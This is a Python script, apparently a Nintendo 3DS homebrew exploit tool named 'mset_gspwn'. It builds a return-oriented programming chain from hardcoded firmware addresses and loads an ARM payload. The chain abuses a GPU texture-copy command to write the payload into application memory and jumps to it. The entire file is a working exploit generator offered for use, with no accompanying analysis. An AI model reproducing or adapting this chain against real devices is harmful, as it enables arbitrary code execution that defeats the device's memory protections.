# mset_gspwn

import sys

from p3ds.util import *
from p3ds.ROP import *

memcpy = 0x001BFA60
GSPGPU_FlushDataCache = 0x0013C5D4
nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue = 0x001AC924
svcSleepThread = 0x001AEA50

gsp_addr = 0x14000000
gsp_handle = 0x0027FAC4
gsp_code_addr = 0x00700000
fcram_code_addr = 0x03E6D000
payload_addr = 0x00140000

def main(argv):
	arm_code = ""
	with open(argv[0], "rb") as fp:
		arm_code = fp.read()
	
	armCodeSize = len(arm_code)
	arm_code += struct.pack("<I", 0xDEADBEEF) * (16 - armCodeSize % 16)
	armCodeSize += (16 - armCodeSize % 16)

	r = ROP(0x002B0000)
	
	r.call_lr(memcpy, [gsp_addr + gsp_code_addr, Ref("arm_code"), armCodeSize])
	
	# pop {r4-r6, pc}
	r.call(GSPGPU_FlushDataCache + 4, [gsp_handle, 0xFFFF8001, gsp_addr + gsp_code_addr, armCodeSize], 3)
	
	# ldmfd sp!, {r4-r8, pc}
	r.call(nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue + 4, [0x27c580 + 0x58, Ref("gxCommand")], 5)
	r.pop_pc()
	r.pop_pc()
	r.pop_pc()
	
	r.call_lr(svcSleepThread, [0x3B9ACA00, 0x00000000])
	
	# Jump to payload
	r.i32(0x100000 + payload_addr)
	
	# Data
	r.label("gxCommand")
	r.i32(0x00000004) # SetTextureCopy
	r.i32(gsp_addr + gsp_code_addr) # source
	r.i32(gsp_addr + fcram_code_addr + payload_addr) # destination
	r.i32(armCodeSize) # size
	r.i32(0x00000000) # dim in
	r.i32(0x00000000) # dim out
	r.i32(0x00000008) # flags
	r.i32(0x00000000) # unused
	
	r.label("arm_code")
	r.data(arm_code)
	
	rop = r.gen()
	
	with open(argv[1], "wb") as fl:
		fl.write(rop)

if __name__ == "__main__":
	main(sys.argv[1:])
	